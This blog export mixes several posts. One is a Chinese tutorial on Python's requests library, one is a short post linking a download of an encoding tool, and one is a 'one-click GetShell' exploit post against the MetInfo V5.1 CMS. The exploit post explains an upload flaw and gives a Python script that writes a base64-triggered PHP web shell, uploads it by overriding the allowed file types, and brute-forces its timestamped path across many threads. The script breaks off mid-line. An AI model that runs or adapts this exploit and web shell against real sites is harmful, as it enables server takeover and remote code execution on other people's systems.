<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">"http://httpbin.org/get"</span>, params=payload)</span><br></pre></td></tr></table></figure>
<p>通过打印输出该URL，你能看到URL已被正确编码:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(r.url)</span><br><span class="line">http://httpbin.org/get?key2=value2&amp;key1=value1</span><br></pre></td></tr></table></figure>
<p>注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。</p>
<hr>
<h2 id="响应内容"><a href="#响应内容" class="headerlink" title="响应内容"></a>响应内容</h2><hr>
<p>我们能读取服务器响应的内容。再次以Github时间线为例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">u'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/...</span></span><br></pre></td></tr></table></figure>
<p>Requests会自动解码来自服务器的内容。大多数unicode字符集都能被无缝地解码。</p>
<p>请求发出后，Requests会基于HTTP头部对响应的编码作出有根据的推测。当你访问 r.text 之时，Requests会使用其推测的文本编码。你可以找出Requests使用了什么编码，并且能够使用 r.encoding 属性来改变它:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.encoding</span><br><span class="line"><span class="string">'utf-8'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.encoding = <span class="string">'ISO-8859-1'</span></span><br></pre></td></tr></table></figure>
<p>如果你改变了编码，每当你访问 r.text ，Request都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding 为相应的编码。这样就能使用正确的编码解析 r.text 了。</p>
<p>在你需要的情况下，Requests也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由Requests来为你处理编码。</p>
<hr>
<h2 id="二进制响应内容"><a href="#二进制响应内容" class="headerlink" title="二进制响应内容"></a>二进制响应内容</h2><hr>
<p>你也能以字节的方式访问请求响应体，对于非文本请求:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.content</span><br><span class="line"><span class="string">b'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/...</span></span><br></pre></td></tr></table></figure>
<p>Requests会自动为你解码 <strong>gzip</strong> 和 <strong>deflate</strong> 传输编码的响应数据。</p>
<p>例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> StringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>i = Image.open(StringIO(r.content))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="JSON响应内容"><a href="#JSON响应内容" class="headerlink" title="JSON响应内容"></a>JSON响应内容</h2><hr>
<p>Requests中也有一个内置的JSON解码器，助你处理JSON数据:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.json()</span><br><span class="line">[&#123;<span class="string">u'repository'</span>: &#123;<span class="string">u'open_issues'</span>: <span class="number">0</span>, <span class="string">u'url'</span>: <span class="string">'https://github.com/...</span></span><br></pre></td></tr></table></figure>
<p>如果JSON解码失败， r.json 就会抛出一个异常。例如，相应内容是 401 (Unauthorized) ，尝试访问 r.json 将会抛出 ValueError: No JSON object could be decoded 异常。</p>
<hr>
<h2 id="原始响应内容"><a href="#原始响应内容" class="headerlink" title="原始响应内容"></a>原始响应内容</h2><hr>
<p>在罕见的情况下你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw 。 如果你确实想这么干，那请你确保在初始请求中设置了 <strong>stream=True</strong> 。具体的你可以这么做:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://github.com/timeline.json'</span>, stream=<span class="keyword">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw</span><br><span class="line">&lt;requests.packages.urllib3.response.HTTPResponse object at <span class="number">0x101194810</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.raw.read(<span class="number">10</span>)</span><br><span class="line"><span class="string">'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'</span></span><br></pre></td></tr></table></figure>
<p>但一般情况下，你应该以下面的模式将文本流保存到文件:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size):</span><br><span class="line">        fd.write(chunk)</span><br></pre></td></tr></table></figure>
<p>使用 Response.iter_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是<strong>优先推荐</strong>的获取内容方式。</p>
<hr>
<h2 id="定制请求头"><a href="#定制请求头" class="headerlink" title="定制请求头"></a>定制请求头</h2><hr>
<p>如果你想为请求添加HTTP头部，只要简单地传递一个 dict 给 headers 参数就可以了。</p>
<p>例如，在前一个示例中我们没有指定content-type:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> json</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/some/endpoint'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>headers = &#123;<span class="string">'content-type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, data=json.dumps(payload), headers=headers)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="更加复杂的POST请求"><a href="#更加复杂的POST请求" class="headerlink" title="更加复杂的POST请求"></a>更加复杂的POST请求</h2><hr>
<p>通常，你想要发送一些编码为表单形式的数据—非常像一个HTML表单。 要实现这个，只需简单地传递一个字典给 <em>data</em> 参数。你的数据字典 在发出请求时会自动编码为表单形式:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(<span class="string">"http://httpbin.org/post"</span>, data=payload)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"form"</span>: &#123;</span><br><span class="line">    <span class="string">"key2"</span>: <span class="string">"value2"</span>,</span><br><span class="line">    <span class="string">"key1"</span>: <span class="string">"value1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict ，那么数据会被直接发布出去。</p>
<p>例如，Github API v3接受编码为JSON的POST/PATCH数据:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> json</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/some/endpoint'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, data=json.dumps(payload))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="POST一个多部分编码-Multipart-Encoded-的文件"><a href="#POST一个多部分编码-Multipart-Encoded-的文件" class="headerlink" title="POST一个多部分编码(Multipart-Encoded)的文件"></a>POST一个多部分编码(Multipart-Encoded)的文件</h2><hr>
<p>Requests使得上传多部分编码文件变得很简单:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你可以显式地设置文件名，文件类型和请求头:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.xls'</span>, open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>), <span class="string">'application/vnd.ms-excel'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果你想，你也可以发送作为文件来接收的字符串:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.csv'</span>, <span class="string">'some,data,to,send\nanother,row,to,send\n'</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"some,data,to,send\\nanother,row,to,send\\n"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果你发送一个非常大的文件作为 multipart/form-data 请求，你可能希望流请求(?)。默认下 requests 不支持, 但有个第三方包支持 - requests-toolbelt. 你可以阅读 toolbelt 文档 来了解使用方法。</p>
<p>在一个请求中发送多文件参考 高级用法 一节.</p>
<hr>
<h2 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h2><hr>
<p>我们可以检测响应状态码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure>
<p>为方便引用，Requests还附带了一个内置的状态码查询对象:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code == requests.codes.ok</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<p>如果发送了一个失败请求(非200响应)，我们可以通过 Response.raise_for_status() 来抛出异常:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r = requests.get(<span class="string">'http://httpbin.org/status/404'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r.status_code</span><br><span class="line"><span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r.raise_for_status()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"requests/models.py"</span>, line <span class="number">832</span>, <span class="keyword">in</span> raise_for_status</span><br><span class="line">    <span class="keyword">raise</span> http_error</span><br><span class="line">requests.exceptions.HTTPError: <span class="number">404</span> Client Error</span><br></pre></td></tr></table></figure>
<p>但是，由于我们的例子中 r 的 status_code 是 200 ，当我们调用 raise_for_status() 时，得到的是:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.raise_for_status()</span><br><span class="line"><span class="keyword">None</span></span><br></pre></td></tr></table></figure>
<p>一切都挺和谐哈。</p>
<hr>
<h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><hr>
<p>我们可以查看以一个Python字典形式展示的服务器响应头:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'content-encoding'</span>: <span class="string">'gzip'</span>,</span><br><span class="line">    <span class="string">'transfer-encoding'</span>: <span class="string">'chunked'</span>,</span><br><span class="line">    <span class="string">'connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">    <span class="string">'server'</span>: <span class="string">'nginx/1.0.4'</span>,</span><br><span class="line">    <span class="string">'x-runtime'</span>: <span class="string">'148ms'</span>,</span><br><span class="line">    <span class="string">'etag'</span>: <span class="string">'"e1ca502697e5c9317743dc078f67693f"'</span>,</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是这个字典比较特殊：它是仅为HTTP头部而生的。根据 RFC 2616 ， HTTP头部是大小写不敏感的。</p>
<p>因此，我们可以使用任意大写形式来访问这些响应头字段:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">'Content-Type'</span>]</span><br><span class="line"><span class="string">'application/json'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers.get(<span class="string">'content-type'</span>)</span><br><span class="line"><span class="string">'application/json'</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><hr>
<p>如果某个响应中包含一些Cookie，你可以快速访问它们:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://example.com/some/cookie/setting/url'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies[<span class="string">'example_cookie_name'</span>]</span><br><span class="line"><span class="string">'example_cookie_value'</span></span><br></pre></td></tr></table></figure>
<p>要想发送你的cookies到服务器，可以使用 cookies 参数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/cookies'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="重定向与请求历史"><a href="#重定向与请求历史" class="headerlink" title="重定向与请求历史"></a>重定向与请求历史</h2><hr>
<p>默认情况下，除了 HEAD, Requests会自动处理所有重定向。</p>
<p>可以使用响应对象的 history 方法来追踪重定向。</p>
<p><strong>Response.history</strong> 是一个:<em>class:Response&lt;requests.Response&gt;</em> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p>
<p>例如，Github将所有的HTTP请求重定向到HTTPS。:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; r = requests.get(&apos;http://github.com&apos;)</span><br><span class="line">&gt;&gt;&gt; r.url</span><br><span class="line">&apos;https://github.com/&apos;</span><br><span class="line">&gt;&gt;&gt; r.status_code</span><br><span class="line">200</span><br><span class="line">&gt;&gt;&gt; r.history</span><br><span class="line">[&lt;Response [301]&gt;]</span><br></pre></td></tr></table></figure>
<p>如果你使用的是GET, OPTIONS, POST, PUT, PATCH 或者 DELETE,，那么你可以通过 allow_redirects 参数禁用重定向处理:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">301</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>
<p>如果你使用的是HEAD，你也可以启用重定向:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(<span class="string">'http://github.com'</span>, allow_redirects=<span class="keyword">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.url</span><br><span class="line"><span class="string">'https://github.com/'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[&lt;Response [<span class="number">301</span>]&gt;]</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h2><hr>
<p>你可以告诉requests在经过以 timeout 参数设定的秒数时间之后停止等待响应:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://github.com'</span>, timeout=<span class="number">0.001</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=<span class="string">'github.com'</span>, port=<span class="number">80</span>): Request timed out. (timeout=<span class="number">0.001</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注::</strong><br>timeout 仅对连接过程有效，与响应体的下载无关。timeout并不是整个下载响应的时间限制，而是如果服务器在<code>timeout</code>秒内没有应答，将会引发一个异常（更精确地说，是在<code>timeout</code>秒内没有从基础套接字上接收到任何字节的数据时）</p>
</blockquote>
<hr>
<h2 id="错误与异常"><a href="#错误与异常" class="headerlink" title="错误与异常"></a>错误与异常</h2><hr>
<p>遇到网络问题（如：DNS查询失败、拒绝连接等）时，Requests会抛出一个 <strong>ConnectionError</strong> 异常。</p>
<p>遇到罕见的无效HTTP响应时，Requests则会抛出一个 <strong>HTTPError</strong> 异常。</p>
<p>若请求超时，则抛出一个 <strong>Timeout</strong> 异常。</p>
<p>若请求超过了设定的最大重定向次数，则会抛出一个 <strong>TooManyRedirects</strong> 异常。</p>
<p>所有Requests显式抛出的异常都继承自 <strong>requests.exceptions.RequestException</strong> 。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>编码转换工具</title>
    <url>/2016/06/09/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.html</url>
    <content><![CDATA[<p><strong>闲来无事，写了款编码转换工具</strong></p>
<p><strong>以我的审美来看，界面应该算美丽</strong></p>
<hr>
<p><strong>截图 :</strong></p>
<hr>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.png" alt="Akkuman"><br><a id="more"></a></p>
<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><p><a href="http://cloud.189.cn/t/yueaMb7VnmAb" target="_blank" rel="noopener"><strong>编码转换工具</strong></a></p>
<p><em>转载请注明出处</em></p>
<p><em>作者博客 53xiaoshou.com | hacktech.cn</em></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>MetInfo V5.1 GetShell一键化工具</title>
    <url>/2016/06/08/MetInfo-V5-1-GetShell%E4%B8%80%E9%94%AE%E5%8C%96%E5%B7%A5%E5%85%B7.html</url>
    <content><![CDATA[<hr>
<h1 id="漏洞解析："><a href="#漏洞解析：" class="headerlink" title="漏洞解析："></a>漏洞解析：</h1><hr>
<p><strong>config/config.inc.php</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$langoks = $db-&gt;get_one(<span class="string">"SELECT * FROM $met_lang WHERE lang='$lang'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$langoks)<span class="keyword">die</span>(<span class="string">'No data in the database,please reinstall.'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$langoks[useok]&amp;&amp;!$metinfoadminok)okinfo(<span class="string">'../404.html'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(count($met_langok)==<span class="number">1</span>)$lang=$met_index_type;</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'"</span>;<span class="comment">//看这里</span></span><br><span class="line"></span><br><span class="line">$result = $db-&gt;query($query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>($list_config= $db-&gt;fetch_array($result))&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($metinfoadminok)$list_config[<span class="string">'value'</span>]=str_replace(<span class="string">'"'</span>, <span class="string">'&amp;#34;'</span>, str_replace(<span class="string">"'"</span>, <span class="string">'&amp;#39;'</span>,$list_config[<span class="string">'value'</span>]));</span><br><span class="line"></span><br><span class="line">	$settings_arr[]=$list_config;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($list_config[<span class="string">'columnid'</span>])&#123;</span><br><span class="line"></span><br><span class="line">		$settings[$list_config[<span class="string">'name'</span>].<span class="string">'_'</span>.$list_config[<span class="string">'columnid'</span>]]=$list_config[<span class="string">'value'</span>];</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">		$settings[$list_config[<span class="string">'name'</span>]]=$list_config[<span class="string">'value'</span>];</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@extract($settings);</span><br></pre></td></tr></table></figure></p>
<hr>
<a id="more"></a>
<p>访问</p>
<p>http:///localhost/metinfo5.1/index.php?lang=metinfo</p>
<p><code>SELECT * FROM met_config WHERE lang=&#39;metinfo&#39; or lang=&#39;metinfo&#39;</code></p>
<hr>
<h2 id="文件命名方式："><a href="#文件命名方式：" class="headerlink" title="文件命名方式："></a>文件命名方式：</h2><hr>
<p><strong>/feedback/uploadfile_save.php</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">srand((double)microtime() * <span class="number">1000000</span>);</span><br><span class="line"></span><br><span class="line">$rnd = rand(<span class="number">100</span>, <span class="number">999</span>);</span><br><span class="line"></span><br><span class="line">$name = date(<span class="string">'U'</span>) + $rnd;</span><br><span class="line"></span><br><span class="line">$name = $name.<span class="string">"."</span>.$ext;</span><br></pre></td></tr></table></figure></p>
<p><strong>文件保存在/upload/file/目录</strong></p>
<p>命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数</p>
<p>可爆破：</p>
<p>如</p>
<p><a href="http://127.0.0.1/upload/file/1465394396.php" target="_blank" rel="noopener">http://127.0.0.1/upload/file/1465394396.php</a></p>
<hr>
<h1 id="一键化利用工具："><a href="#一键化利用工具：" class="headerlink" title="一键化利用工具："></a>一键化利用工具：</h1><hr>
<p><strong>本程序基于python编写</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'</span>&#125;</span><br><span class="line"></span><br><span class="line">urls = Queue.Queue()</span><br><span class="line"><span class="comment">#http://hb.jhxjd.com/upload/file/1441445378.php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">(urls,time_out)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> urls.empty():</span><br><span class="line">        base_url = urls.get()</span><br><span class="line">        response = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            time.sleep(int(time_out))<span class="comment">#延时设置</span></span><br><span class="line">            response = requests.get(base_url,headers=headers)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">404</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Not Fount----%s\n'</span> % base_url</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">if</span> response:</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">'url.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(<span class="string">'%s?e=YXNzZXJ0\n'</span>%base_url)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_url,thread_num,time_out)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#取出当前时间戳并删除后四位</span></span><br><span class="line">    now = str(int(time.time()))[:<span class="number">-4</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#将所有的待爆破地址遍历并加入队列</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</span><br><span class="line">            num_str = <span class="string">''</span>.join((str(i),str(j)))</span><br><span class="line">            url = <span class="string">''</span>.join((<span class="string">'%s/upload/file/%s'</span> % (target_url,now),num_str,<span class="string">'.php'</span>))</span><br><span class="line">            urls.put(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#上传文件</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'xiaoma.php'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> fi:</span><br><span class="line">        fi.write(<span class="string">"&lt;?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?&gt;"</span>)</span><br><span class="line">    data = &#123;</span><br><span class="line">            <span class="string">'fd_para[1][para]'</span>:<span class="string">'filea'</span>,</span><br><span class="line">            <span class="string">'fd_para[1][type]'</span>:<span class="string">'5'</span></span><br><span class="line">            &#125;</span><br><span class="line">    files = &#123;<span class="string">'filea'</span>: open(<span class="string">"xiaoma.php"</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line">    upload_url = <span class="string">'%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo'</span> % target_url</span><br><span class="line">    res = requests.post(upload_url,data = data,files=files)</span><br><span class="line">    <span class="comment">#等待两秒  文件上传</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动多线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(thread_num)):</span><br><span class="line">        t = 